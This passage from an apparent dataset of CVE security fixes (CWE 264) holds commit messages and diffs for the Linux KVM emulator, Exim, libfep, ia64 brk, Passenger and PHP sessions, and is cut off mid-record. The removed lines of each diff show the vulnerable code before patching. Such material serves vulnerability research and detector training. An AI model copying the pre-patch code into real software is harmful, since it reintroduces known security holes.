dst)\n+{\n+\treturn assign_eip_far(ctxt, dst, ctxt->mode == X86EMUL_MODE_PROT64);\n }\n \n-static inline void jmp_rel(struct x86_emulate_ctxt *ctxt, int rel)\n+static inline int jmp_rel(struct x86_emulate_ctxt *ctxt, int rel)\n {\n-\tassign_eip_near(ctxt, ctxt->_eip + rel);\n+\treturn assign_eip_near(ctxt, ctxt->_eip + rel);\n }\n \n static u16 get_segment_selector(struct x86_emulate_ctxt *ctxt, unsigned seg)\n@@ -1998,13 +2008,15 @@ static int em_grp45(struct x86_emulate_ctxt *ctxt)\n \tcase 2: \/* call near abs *\/ {\n \t\tlong int old_eip;\n \t\told_eip = ctxt->_eip;\n-\t\tctxt->_eip = ctxt->src.val;\n+\t\trc = assign_eip_near(ctxt, ctxt->src.val);\n+\t\tif (rc != X86EMUL_CONTINUE)\n+\t\t\tbreak;\n \t\tctxt->src.val = old_eip;\n \t\trc = em_push(ctxt);\n \t\tbreak;\n \t}\n \tcase 4: \/* jmp abs *\/\n-\t\tctxt->_eip = ctxt->src.val;\n+\t\trc = assign_eip_near(ctxt, ctxt->src.val);\n \t\tbreak;\n \tcase 5: \/* jmp far *\/\n \t\trc = em_jmp_far(ctxt);\n@@ -2039,10 +2051,14 @@ static int em_cmpxchg8b(struct x86_emulate_ctxt *ctxt)\n \n static int em_ret(struct x86_emulate_ctxt *ctxt)\n {\n-\tctxt->dst.type = OP_REG;\n-\tctxt->dst.addr.reg = &ctxt->_eip;\n-\tctxt->dst.bytes = ctxt->op_bytes;\n-\treturn em_pop(ctxt);\n+\tint rc;\n+\tunsigned long eip;\n+\n+\trc = emulate_pop(ctxt, &eip, ctxt->op_bytes);\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\treturn rc;\n+\n+\treturn assign_eip_near(ctxt, eip);\n }\n \n static int em_ret_far(struct x86_emulate_ctxt *ctxt)\n@@ -2323,7 +2339,7 @@ static int em_sysexit(struct x86_emulate_ctxt *ctxt)\n {\n \tconst struct x86_emulate_ops *ops = ctxt->ops;\n \tstruct desc_struct cs, ss;\n-\tu64 msr_data;\n+\tu64 msr_data, rcx, rdx;\n \tint usermode;\n \tu16 cs_sel = 0, ss_sel = 0;\n \n@@ -2339,6 +2355,9 @@ static int em_sysexit(struct x86_emulate_ctxt *ctxt)\n \telse\n \t\tusermode = X86EMUL_MODE_PROT32;\n \n+\trcx = reg_read(ctxt, VCPU_REGS_RCX);\n+\trdx = reg_read(ctxt, VCPU_REGS_RDX);\n+\n \tcs.dpl = 3;\n \tss.dpl = 3;\n \tops->get_msr(ctxt, MSR_IA32_SYSENTER_CS, &msr_data);\n@@ -2356,6 +2375,9 @@ static int em_sysexit(struct x86_emulate_ctxt *ctxt)\n \t\tss_sel = cs_sel + 8;\n \t\tcs.d = 0;\n \t\tcs.l = 1;\n+\t\tif (is_noncanonical_address(rcx) ||\n+\t\t    is_noncanonical_address(rdx))\n+\t\t\treturn emulate_gp(ctxt, 0);\n \t\tbreak;\n \t}\n \tcs_sel |= SELECTOR_RPL_MASK;\n@@ -2364,8 +2386,8 @@ static int em_sysexit(struct x86_emulate_ctxt *ctxt)\n \tops->set_segment(ctxt, cs_sel, &cs, 0, VCPU_SREG_CS);\n \tops->set_segment(ctxt, ss_sel, &ss, 0, VCPU_SREG_SS);\n \n-\tctxt->_eip = reg_read(ctxt, VCPU_REGS_RDX);\n-\t*reg_write(ctxt, VCPU_REGS_RSP) = reg_read(ctxt, VCPU_REGS_RCX);\n+\tctxt->_eip = rdx;\n+\t*reg_write(ctxt, VCPU_REGS_RSP) = rcx;\n \n \treturn X86EMUL_CONTINUE;\n }\n@@ -2905,10 +2927,13 @@ static int em_aad(struct x86_emulate_ctxt *ctxt)\n \n static int em_call(struct x86_emulate_ctxt *ctxt)\n {\n+\tint rc;\n \tlong rel = ctxt->src.val;\n \n \tctxt->src.val = (unsigned long)ctxt->_eip;\n-\tjmp_rel(ctxt, rel);\n+\trc = jmp_rel(ctxt, rel);\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\treturn rc;\n \treturn em_push(ctxt);\n }\n \n@@ -2940,11 +2965,12 @@ static int em_call_far(struct x86_emulate_ctxt *ctxt)\n static int em_ret_near_imm(struct x86_emulate_ctxt *ctxt)\n {\n \tint rc;\n+\tunsigned long eip;\n \n-\tctxt->dst.type = OP_REG;\n-\tctxt->dst.addr.reg = &ctxt->_eip;\n-\tctxt->dst.bytes = ctxt->op_bytes;\n-\trc = emulate_pop(ctxt, &ctxt->dst.val, ctxt->op_bytes);\n+\trc = emulate_pop(ctxt, &eip, ctxt->op_bytes);\n+\tif (rc != X86EMUL_CONTINUE)\n+\t\treturn rc;\n+\trc = assign_eip_near(ctxt, eip);\n \tif (rc != X86EMUL_CONTINUE)\n \t\treturn rc;\n \trsp_increment(ctxt, ctxt->src.val);\n@@ -3271,20 +3297,24 @@ static int em_lmsw(struct x86_emulate_ctxt *ctxt)\n \n static int em_loop(struct x86_emulate_ctxt *ctxt)\n {\n+\tint rc = X86EMUL_CONTINUE;\n+\n \tregister_address_increment(ctxt, reg_rmw(ctxt, VCPU_REGS_RCX), -1);\n \tif ((address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) != 0) &&\n \t    (ctxt->b == 0xe2 || test_cc(ctxt->b ^ 0x5, ctxt->eflags)))\n-\t\tjmp_rel(ctxt, ctxt->src.val);\n+\t\trc = jmp_rel(ctxt, ctxt->src.val);\n \n-\treturn X86EMUL_CONTINUE;\n+\treturn rc;\n }\n \n static int em_jcxz(struct x86_emulate_ctxt *ctxt)\n {\n+\tint rc = X86EMUL_CONTINUE;\n+\n \tif (address_mask(ctxt, reg_read(ctxt, VCPU_REGS_RCX)) == 0)\n-\t\tjmp_rel(ctxt, ctxt->src.val);\n+\t\trc = jmp_rel(ctxt, ctxt->src.val);\n \n-\treturn X86EMUL_CONTINUE;\n+\treturn rc;\n }\n \n static int em_in(struct x86_emulate_ctxt *ctxt)\n@@ -4743,7 +4773,7 @@ special_insn:\n \t\tbreak;\n \tcase 0x70 ... 0x7f: \/* jcc (short) *\/\n \t\tif (test_cc(ctxt->b, ctxt->eflags))\n-\t\t\tjmp_rel(ctxt, ctxt->src.val);\n+\t\t\trc = jmp_rel(ctxt, ctxt->src.val);\n \t\tbreak;\n \tcase 0x8d: \/* lea r16\/r32, m *\/\n \t\tctxt->dst.val = ctxt->src.addr.mem.ea;\n@@ -4773,7 +4803,7 @@ special_insn:\n \t\tbreak;\n \tcase 0xe9: \/* jmp rel *\/\n \tcase 0xeb: \/* jmp rel short *\/\n-\t\tjmp_rel(ctxt, ctxt->src.val);\n+\t\trc = jmp_rel(ctxt, ctxt->src.val);\n \t\tctxt->dst.type = OP_NONE; \/* Disable writeback. *\/\n \t\tbreak;\n \tcase 0xf4:              \/* hlt *\/\n@@ -4898,7 +4928,7 @@ twobyte_insn:\n \t\tbreak;\n \tcase 0x80 ... 0x8f: \/* jnz rel, etc*\/\n \t\tif (test_cc(ctxt->b, ctxt->eflags))\n-\t\t\tjmp_rel(ctxt, ctxt->src.val);\n+\t\t\trc = jmp_rel(ctxt, ctxt->src.val);\n \t\tbreak;\n \tcase 0x90 ... 0x9f:     \/* setcc r\/m8 *\/\n \t\tctxt->dst.val = test_cc(ctxt->b, ctxt->eflags);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2017-1000369","CWE_ID":"264","category":"security","commit_id":"65e061b76867a9ea7aeeb535341b790b90ae6c21","commit_message":"From 65e061b76867a9ea7aeeb535341b790b90ae6c21 Mon Sep 17 00:00:00 2001\nFrom: \"Heiko Schlittermann (HS12-RIPE)\" <hs@schlittermann.de>\nDate: Wed, 31 May 2017 23:08:56 +0200\nSubject: [PATCH] Cleanup (prevent repeated use of -p\/-oMr to avoid mem leak)\n\n---\n doc\/doc-docbook\/spec.xfpt |  3 ++-\n src\/src\/exim.c            | 19 +++++++++++++++++--\n 2 files changed, 19 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/doc\/doc-docbook\/spec.xfpt b\/doc\/doc-docbook\/spec.xfpt\nindex 06373ccde..7816bc26d 100644\n--- a\/doc\/doc-docbook\/spec.xfpt\n+++ b\/doc\/doc-docbook\/spec.xfpt\n@@ -4274,7 +4274,7 @@ or &%-bs%& is used. For &%-bh%&, the protocol is forced to one of the standard\n SMTP protocol names (see the description of &$received_protocol$& in section\n &<<SECTexpvar>>&). For &%-bs%&, the protocol is always &\"local-\"& followed by\n one of those same names. For &%-bS%& (batched SMTP) however, the protocol can\n-be set by &%-oMr%&.\n+be set by &%-oMr%&. Repeated use of this option is not supported.\n \n .vitem &%-oMs%&&~<&'host&~name'&>\n .oindex \"&%-oMs%&\"\n@@ -4374,6 +4374,7 @@ host name and its colon can be omitted when only the protocol is to be set.\n Note the Exim already has two private options, &%-pd%& and &%-ps%&, that refer\n to embedded Perl. It is therefore impossible to set a protocol value of &`d`&\n or &`s`& using this option (but that does not seem a real limitation).\n+Repeated use of this option is not supported.\n \n .vitem &%-q%&\n .oindex \"&%-q%&\"\ndiff --git a\/src\/src\/exim.c b\/src\/src\/exim.c\nindex 67583e584..88e119778 100644\n--- a\/src\/src\/exim.c\n+++ b\/src\/src\/exim.c\n@@ -3106,7 +3106,14 @@ for (i = 1; i < argc; i++)\n \n       \/* -oMr: Received protocol *\/\n \n-      else if (Ustrcmp(argrest, \"Mr\") == 0) received_protocol = argv[++i];\n+      else if (Ustrcmp(argrest, \"Mr\") == 0)\n+\n+        if (received_protocol)\n+          {\n+          fprintf(stderr, \"received_protocol is set already\\n\");\n+          exit(EXIT_FAILURE);\n+          }\n+        else received_protocol = argv[++i];\n \n       \/* -oMs: Set sender host name *\/\n \n@@ -3202,7 +3209,15 @@ for (i = 1; i < argc; i++)\n \n     if (*argrest != 0)\n       {\n-      uschar *hn = Ustrchr(argrest, ':');\n+      uschar *hn;\n+\n+      if (received_protocol)\n+        {\n+        fprintf(stderr, \"received_protocol is set already\\n\");\n+        exit(EXIT_FAILURE);\n+        }\n+\n+      hn = Ustrchr(argrest, ':');\n       if (hn == NULL)\n         {\n         received_protocol = argrest;\n","owner":"Exim","repo":"exim","source":"cve"},{"CVE_ID":"CVE-2014-3980","CWE_ID":"264","category":"security","commit_id":"293d9d3f7565f01a9dc40b53259886832eaa2ace","commit_message":"From 293d9d3f7565f01a9dc40b53259886832eaa2ace Mon Sep 17 00:00:00 2001\nFrom: Daiki Ueno <ueno@unixuser.org>\nDate: Wed, 4 Jun 2014 17:35:31 +0900\nSubject: [PATCH] Don't use abstract Unix domain sockets\n\n---\n fep\/control.c   | 7 -------\n libfep\/client.c | 6 ------\n 2 files changed, 13 deletions(-)\n\n","diff_code":"diff --git a\/fep\/control.c b\/fep\/control.c\nindex 7a19da4..5a25d26 100644\n--- a\/fep\/control.c\n+++ b\/fep\/control.c\n@@ -97,15 +97,8 @@ _fep_open_control_socket (Fep *fep)\n   memset (&sun, 0, sizeof(sun));\n   sun.sun_family = AF_UNIX;\n \n-#ifdef __linux__\n-  sun.sun_path[0] = '\\0';\n-  memcpy (sun.sun_path + 1, path, strlen (path));\n-  sun_len = offsetof (struct sockaddr_un, sun_path) + strlen (path) + 1;\n-  remove_control_socket (path);\n-#else\n   memcpy (sun.sun_path, path, strlen (path));\n   sun_len = sizeof (struct sockaddr_un);\n-#endif\n \n   if (bind (fd, (const struct sockaddr *) &sun, sun_len) < 0)\n     {\ndiff --git a\/libfep\/client.c b\/libfep\/client.c\nindex d267b0a..5076522 100644\n--- a\/libfep\/client.c\n+++ b\/libfep\/client.c\n@@ -90,14 +90,8 @@ fep_client_open (const char *address)\n   memset (&sun, 0, sizeof(struct sockaddr_un));\n   sun.sun_family = AF_UNIX;\n \n-#ifdef __linux__\n-  sun.sun_path[0] = '\\0';\n-  memcpy (sun.sun_path + 1, address, strlen (address));\n-  sun_len = offsetof (struct sockaddr_un, sun_path) + strlen (address) + 1;\n-#else\n   memcpy (sun.sun_path, address, strlen (address));\n   sun_len = sizeof (struct sockaddr_un);\n-#endif\n \n   client->control = socket (AF_UNIX, SOCK_STREAM, 0);\n   if (client->control < 0)\n","owner":"ueno","repo":"libfep","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"bb52d6694002b9d632bb355f64daa045c6293a4e","commit_message":"From bb52d6694002b9d632bb355f64daa045c6293a4e Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Thu, 3 Dec 2009 19:59:24 -0500\nSubject: Get rid of open-coding in ia64_brk()\n\nThe comment in there used to be true, but these days do_brk() does\nthe arch-specific check that covers what we open-coded here.  So we\ncan use sys_brk() just fine, only need to do force_successful_syscall_return()\nafter it.\n\nSee commit 3a459756810912d2c2bf188cef566af255936b4d - that's when the\nchecks in do_brk() had been originally added.\n\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n arch\/ia64\/kernel\/sys_ia64.c | 46 +--------------------------------------------\n 1 file changed, 1 insertion(+), 45 deletions(-)\n\n","diff_code":"diff --git a\/arch\/ia64\/kernel\/sys_ia64.c b\/arch\/ia64\/kernel\/sys_ia64.c\nindex ae384a2974c2..609d50056a6c 100644\n--- a\/arch\/ia64\/kernel\/sys_ia64.c\n+++ b\/arch\/ia64\/kernel\/sys_ia64.c\n@@ -100,51 +100,7 @@ sys_getpagesize (void)\n asmlinkage unsigned long\n ia64_brk (unsigned long brk)\n {\n-\tunsigned long rlim, retval, newbrk, oldbrk;\n-\tstruct mm_struct *mm = current->mm;\n-\n-\t\/*\n-\t * Most of this replicates the code in sys_brk() except for an additional safety\n-\t * check and the clearing of r8.  However, we can't call sys_brk() because we need\n-\t * to acquire the mmap_sem before we can do the test...\n-\t *\/\n-\tdown_write(&mm->mmap_sem);\n-\n-\tif (brk < mm->end_code)\n-\t\tgoto out;\n-\tnewbrk = PAGE_ALIGN(brk);\n-\toldbrk = PAGE_ALIGN(mm->brk);\n-\tif (oldbrk == newbrk)\n-\t\tgoto set_brk;\n-\n-\t\/* Always allow shrinking brk. *\/\n-\tif (brk <= mm->brk) {\n-\t\tif (!do_munmap(mm, newbrk, oldbrk-newbrk))\n-\t\t\tgoto set_brk;\n-\t\tgoto out;\n-\t}\n-\n-\t\/* Check against unimplemented\/unmapped addresses: *\/\n-\tif ((newbrk - oldbrk) > RGN_MAP_LIMIT || REGION_OFFSET(newbrk) > RGN_MAP_LIMIT)\n-\t\tgoto out;\n-\n-\t\/* Check against rlimit.. *\/\n-\trlim = current->signal->rlim[RLIMIT_DATA].rlim_cur;\n-\tif (rlim < RLIM_INFINITY && brk - mm->start_data > rlim)\n-\t\tgoto out;\n-\n-\t\/* Check against existing mmap mappings. *\/\n-\tif (find_vma_intersection(mm, oldbrk, newbrk+PAGE_SIZE))\n-\t\tgoto out;\n-\n-\t\/* Ok, looks good - let it rip. *\/\n-\tif (do_brk(oldbrk, newbrk-oldbrk) != oldbrk)\n-\t\tgoto out;\n-set_brk:\n-\tmm->brk = brk;\n-out:\n-\tretval = mm->brk;\n-\tup_write(&mm->mmap_sem);\n+\tunsigned long retval = sys_brk(brk);\n \tforce_successful_syscall_return();\n \treturn retval;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2018-12615","CWE_ID":"264","category":"security","commit_id":"4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8","commit_message":"From 4e97fdb86d0a0141ec9a052c6e691fcd07bb45c8 Mon Sep 17 00:00:00 2001\nFrom: \"Hongli Lai (Phusion)\" <hongli@phusion.nl>\nDate: Tue, 29 May 2018 15:33:50 +0200\nSubject: [PATCH] ExecHelperMain: fix privilege lowering code\n\n---\n src\/agent\/ExecHelper\/ExecHelperMain.cpp | 3 +++\n 1 file changed, 3 insertions(+)\n\n","diff_code":"diff --git a\/src\/agent\/ExecHelper\/ExecHelperMain.cpp b\/src\/agent\/ExecHelper\/ExecHelperMain.cpp\nindex 1e5ae58e2a..1700a52032 100644\n--- a\/src\/agent\/ExecHelper\/ExecHelperMain.cpp\n+++ b\/src\/agent\/ExecHelper\/ExecHelperMain.cpp\n@@ -201,6 +201,9 @@ switchGroup(uid_t uid, const struct passwd *userInfo, gid_t gid) {\n \t\t\tif (ngroups <= NGROUPS_MAX) {\n \t\t\t\tsetgroupsCalled = true;\n \t\t\t\tgidset.reset(new gid_t[ngroups]);\n+\t\t\t\tfor (int i = 0; i < ngroups; i++) {\n+\t\t\t\t\tgidset[i] = groups[i];\n+\t\t\t\t}\n \t\t\t\tif (setgroups(ngroups, gidset.get()) == -1) {\n \t\t\t\t\tint e = errno;\n \t\t\t\t\tfprintf(stderr, \"ERROR: setgroups(%d, ...) failed: %s (errno=%d)\\n\",\n","owner":"phusion","repo":"passenger","source":"cve"},{"CVE_ID":"CVE-2012-2319","CWE_ID":"264","category":"security","commit_id":"6f24f892871acc47b40dd594c63606a17c714f77","commit_message":"From 6f24f892871acc47b40dd594c63606a17c714f77 Mon Sep 17 00:00:00 2001\nFrom: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nDate: Fri, 4 May 2012 12:09:39 -0700\nSubject: hfsplus: Fix potential buffer overflows\n\nCommit ec81aecb2966 (\"hfs: fix a potential buffer overflow\") fixed a few\npotential buffer overflows in the hfs filesystem.  But as Timo Warns\npointed out, these changes also need to be made on the hfsplus\nfilesystem as well.\n\nReported-by: Timo Warns <warns@pre-sense.de>\nAcked-by: WANG Cong <amwang@redhat.com>\nCc: Alexey Khoroshilov <khoroshilov@ispras.ru>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Sage Weil <sage@newdream.net>\nCc: Eugene Teo <eteo@redhat.com>\nCc: Roman Zippel <zippel@linux-m68k.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Alexey Dobriyan <adobriyan@gmail.com>\nCc: Dave Anderson <anderson@redhat.com>\nCc: stable <stable@vger.kernel.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/hfsplus\/catalog.c |  4 ++++\n fs\/hfsplus\/dir.c     | 11 +++++++++++\n 2 files changed, 15 insertions(+)\n\n","diff_code":"diff --git a\/fs\/hfsplus\/catalog.c b\/fs\/hfsplus\/catalog.c\nindex 4dfbfec357e8..ec2a9c23f0c9 100644\n--- a\/fs\/hfsplus\/catalog.c\n+++ b\/fs\/hfsplus\/catalog.c\n@@ -366,6 +366,10 @@ int hfsplus_rename_cat(u32 cnid,\n \terr = hfs_brec_find(&src_fd);\n \tif (err)\n \t\tgoto out;\n+\tif (src_fd.entrylength > sizeof(entry) || src_fd.entrylength < 0) {\n+\t\terr = -EIO;\n+\t\tgoto out;\n+\t}\n \n \thfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,\n \t\t\t\tsrc_fd.entrylength);\ndiff --git a\/fs\/hfsplus\/dir.c b\/fs\/hfsplus\/dir.c\nindex 88e155f895c6..26b53fb09f68 100644\n--- a\/fs\/hfsplus\/dir.c\n+++ b\/fs\/hfsplus\/dir.c\n@@ -150,6 +150,11 @@ static int hfsplus_readdir(struct file *filp, void *dirent, filldir_t filldir)\n \t\tfilp->f_pos++;\n \t\t\/* fall through *\/\n \tcase 1:\n+\t\tif (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {\n+\t\t\terr = -EIO;\n+\t\t\tgoto out;\n+\t\t}\n+\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\tif (be16_to_cpu(entry.type) != HFSPLUS_FOLDER_THREAD) {\n@@ -181,6 +186,12 @@ static int hfsplus_readdir(struct file *filp, void *dirent, filldir_t filldir)\n \t\t\terr = -EIO;\n \t\t\tgoto out;\n \t\t}\n+\n+\t\tif (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {\n+\t\t\terr = -EIO;\n+\t\t\tgoto out;\n+\t\t}\n+\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\ttype = be16_to_cpu(entry.type);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4718","CWE_ID":"264","category":"security","commit_id":"25e8fcc88fa20dc9d4c47184471003f436927cde","commit_message":"From 25e8fcc88fa20dc9d4c47184471003f436927cde Mon Sep 17 00:00:00 2001\nFrom: Yasuo Ohgaki <yohgaki@php.net>\nDate: Tue, 25 Jun 2013 19:47:04 +0900\nSubject: [PATCH] Strict session\n\n---\n ext\/session\/mod_files.c                            |  81 ++++++++------\n ext\/session\/mod_files.h                            |   2 +-\n ext\/session\/mod_mm.c                               |  46 +++++++-\n ext\/session\/php_session.h                          |  10 +-\n ext\/session\/session.c                              | 124 ++++++++++++++-------\n ext\/session\/tests\/003.phpt                         |   1 +\n ext\/session\/tests\/004.phpt                         |   1 +\n ext\/session\/tests\/005.phpt                         |   1 +\n ext\/session\/tests\/006.phpt                         |   1 +\n ext\/session\/tests\/009.phpt                         |   1 +\n ext\/session\/tests\/012.phpt                         |   1 +\n ext\/session\/tests\/013.phpt                         |   1 +\n ext\/session\/tests\/014.phpt                         |   1 +\n ext\/session\/tests\/015.phpt                         |   1 +\n ext\/session\/tests\/016.phpt                         |   7 +-\n ext\/session\/tests\/018.phpt                         |   1 +\n ext\/session\/tests\/019.phpt                         |   1 +\n ext\/session\/tests\/020.phpt                         |   1 +\n ext\/session\/tests\/021.phpt                         |   1 +\n ext\/session\/tests\/023.phpt                         |   1 +\n ext\/session\/tests\/024.phpt                         |   1 +\n ext\/session\/tests\/025.phpt                         |   1 +\n ext\/session\/tests\/026.phpt                         |   1 +\n ext\/session\/tests\/027.phpt                         |   1 +\n ext\/session\/tests\/030.phpt                         |   1 +\n ext\/session\/tests\/bug41600.phpt                    |   1 +\n ext\/session\/tests\/bug60634.phpt                    |   3 +-\n ext\/session\/tests\/bug60634_error_1.phpt            |   3 +-\n ext\/session\/tests\/bug60634_error_2.phpt            |   7 +-\n ext\/session\/tests\/bug60634_error_3.phpt            |   3 +-\n ext\/session\/tests\/bug60634_error_4.phpt            |   7 +-\n ext\/session\/tests\/rfc1867_sid_invalid.phpt         |  10 ++\n ext\/session\/tests\/session_commit_variation4.phpt   |   2 +\n ...\/tests\/session_save_path_variation2.phpt        |   2 +-\n ...\/tests\/session_set_save_handler_error2.phpt     |   2 +\n ...\/tests\/session_set_save_handler_error3.phpt     |   1 -\n ...\/tests\/session_set_save_handler_error4.phpt     |   1 -\n ...\/tests\/session_write_close_variation4.phpt      |   2 +\n 38 files changed, 240 insertions(+), 93 deletions(-)\n\n","diff_code":"diff --git a\/ext\/session\/mod_files.c b\/ext\/session\/mod_files.c\nindex 053c617..e9dc25a 100644\n--- a\/ext\/session\/mod_files.c\n+++ b\/ext\/session\/mod_files.c\n@@ -61,40 +61,9 @@ typedef struct {\n } ps_files;\n \n ps_module ps_mod_files = {\n-\tPS_MOD(files)\n+\tPS_MOD_SID(files)\n };\n \n-\/* If you change the logic here, please also update the error message in\n- * ps_files_open() appropriately *\/\n-static int ps_files_valid_key(const char *key)\n-{\n-\tsize_t len;\n-\tconst char *p;\n-\tchar c;\n-\tint ret = 1;\n-\n-\tfor (p = key; (c = *p); p++) {\n-\t\t\/* valid characters are a..z,A..Z,0..9 *\/\n-\t\tif (!((c >= 'a' && c <= 'z')\n-\t\t\t\t|| (c >= 'A' && c <= 'Z')\n-\t\t\t\t|| (c >= '0' && c <= '9')\n-\t\t\t\t|| c == ','\n-\t\t\t\t|| c == '-')) {\n-\t\t\tret = 0;\n-\t\t\tbreak;\n-\t\t}\n-\t}\n-\n-\tlen = p - key;\n-\n-\t\/* Somewhat arbitrary length limit here, but should be way more than\n-\t   anyone needs and avoids file-level warnings later on if we exceed MAX_PATH *\/\n-\tif (len == 0 || len > 128) {\n-\t\tret = 0;\n-\t}\n-\n-\treturn ret;\n-}\n \n static char *ps_files_path_create(char *buf, size_t buflen, ps_files *data, const char *key)\n {\n@@ -155,11 +124,11 @@ static void ps_files_open(ps_files *data, const char *key TSRMLS_DC)\n \n \t\tps_files_close(data);\n \n-\t\tif (!ps_files_valid_key(key)) {\n+\t\tif (php_session_valid_key(key) == FAILURE) {\n \t\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,'\");\n-\t\t\tPS(invalid_session_id) = 1;\n \t\t\treturn;\n \t\t}\n+\n \t\tif (!ps_files_path_create(buf, sizeof(buf), data, key)) {\n \t\t\treturn;\n \t\t}\n@@ -253,6 +222,21 @@ static int ps_files_cleanup_dir(const char *dirname, int maxlifetime TSRMLS_DC)\n \treturn (nrdels);\n }\n \n+static int ps_files_key_exists(ps_files *data, const char *key TSRMLS_DC)\n+{\n+\tchar buf[MAXPATHLEN];\n+\tstruct stat sbuf;\n+\n+\tif (!key || !ps_files_path_create(buf, sizeof(buf), data, key)) {\n+\t\treturn FAILURE;\n+\t}\n+\tif (VCWD_STAT(buf, &sbuf)) {\n+\t\treturn FAILURE;\n+\t}\n+\treturn SUCCESS;\n+}\n+\n+\n #define PS_FILES_DATA ps_files *data = PS_GET_MOD_DATA()\n \n PS_OPEN_FUNC(files)\n@@ -342,6 +326,24 @@ PS_READ_FUNC(files)\n \tstruct stat sbuf;\n \tPS_FILES_DATA;\n \n+\t\/* If strict mode, check session id existence *\/\n+\tif (PS(use_strict_mode) &&\n+\t\tps_files_key_exists(data, key TSRMLS_CC) == FAILURE) {\n+\t\t\/* key points to PS(id), but cannot change here. *\/\n+\t\tif (key) {\n+\t\t\tefree(PS(id));\n+\t\t\tPS(id) = NULL;\n+\t\t}\n+\t\tPS(id) = PS(mod)->s_create_sid((void **)&data, NULL TSRMLS_CC);\n+\t\tif (!PS(id)) {\n+\t\t\treturn FAILURE;\n+\t\t}\n+\t\tphp_session_reset_id(TSRMLS_C);\n+\t\tif (PS(use_cookies)) {\n+\t\t\tPS(send_cookie) = 1;\n+\t\t}\n+\t}\n+\n \tps_files_open(data, key TSRMLS_CC);\n \tif (data->fd < 0) {\n \t\treturn FAILURE;\n@@ -454,6 +456,17 @@ PS_GC_FUNC(files)\n \treturn SUCCESS;\n }\n \n+PS_CREATE_SID_FUNC(files)\n+{\n+\tchar *sid;\n+\tPS_FILES_DATA;\n+\n+\tsid = php_session_create_id((void **)&data, newlen TSRMLS_CC);\n+\n+\treturn sid;\n+}\n+\n+\n \/*\n  * Local variables:\n  * tab-width: 4\ndiff --git a\/ext\/session\/mod_files.h b\/ext\/session\/mod_files.h\nindex c97d168..94cbd6d 100644\n--- a\/ext\/session\/mod_files.h\n+++ b\/ext\/session\/mod_files.h\n@@ -24,6 +24,6 @@\n extern ps_module ps_mod_files;\n #define ps_files_ptr &ps_mod_files\n \n-PS_FUNCS(files);\n+PS_FUNCS_SID(files);\n \n #endif\ndiff --git a\/ext\/session\/mod_mm.c b\/ext\/session\/mod_mm.c\nindex e0d16d1..7ca9083 100644\n--- a\/ext\/session\/mod_mm.c\n+++ b\/ext\/session\/mod_mm.c\n@@ -124,7 +124,7 @@ static ps_sd *ps_sd_new(ps_mm *data, const char *key)\n \tif (!sd) {\n \t\tTSRMLS_FETCH();\n \n-\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"mm_malloc failed, avail %d, err %s\", mm_available(data->mm), mm_error());\n+\t\tphp_error_docref(NULL TSRMLS_CC, E_WARNING, \"mm_malloc failed, avail %ld, err %s\", mm_available(data->mm), mm_error());\n \t\treturn NULL;\n \t}\n \n@@ -208,8 +208,22 @@ static ps_sd *ps_sd_lookup(ps_mm *data, const char *key, int rw)\n \treturn ret;\n }\n \n+static int ps_mm_key_exists(ps_mm *data, const char *key TSRMLS_DC)\n+{\n+\tps_sd *sd;\n+\n+\tif (!key) {\n+\t\treturn FAILURE;\n+\t}\n+\tsd = ps_sd_lookup(data, key, 0);\n+\tif (sd) {\n+\t\treturn SUCCESS;\n+\t}\n+\treturn FAILURE;\n+}\n+\n ps_module ps_mod_mm = {\n-\tPS_MOD(mm)\n+\tPS_MOD_SID(mm)\n };\n \n #define PS_MM_DATA ps_mm *data = PS_GET_MOD_DATA()\n@@ -341,6 +355,24 @@ PS_READ_FUNC(mm)\n \n \tmm_lock(data->mm, MM_LOCK_RD);\n \n+\t\/* If there is an ID and strict mode, verify existence *\/\n+\tif (PS(use_strict_mode)\n+\t\t&& ps_mm_key_exists(data, key TSRMLS_CC) == FAILURE) {\n+\t\t\/* key points to PS(id), but cannot change here. *\/\n+\t\tif (key) {\n+\t\t\tefree(PS(id));\n+\t\t\tPS(id) = NULL;\n+\t\t}\n+\t\tPS(id) = PS(mod)->s_create_sid((void **)&data, NULL TSRMLS_CC);\n+\t\tif (!PS(id)) {\n+\t\t\treturn FAILURE;\n+\t\t}\n+\t\tphp_session_reset_id(TSRMLS_C);\n+\t\tif (PS(use_cookies)) {\n+\t\t\tPS(send_cookie) = 1;\n+\t\t}\n+\t}\n+\n \tsd = ps_sd_lookup(data, key, 0);\n \tif (sd) {\n \t\t*vallen = sd->datalen;\n@@ -444,6 +476,16 @@ PS_GC_FUNC(mm)\n \treturn SUCCESS;\n }\n \n+PS_CREATE_SID_FUNC(mm)\n+{\n+\tchar *sid;\n+\tPS_MM_DATA;\n+\n+\tsid = 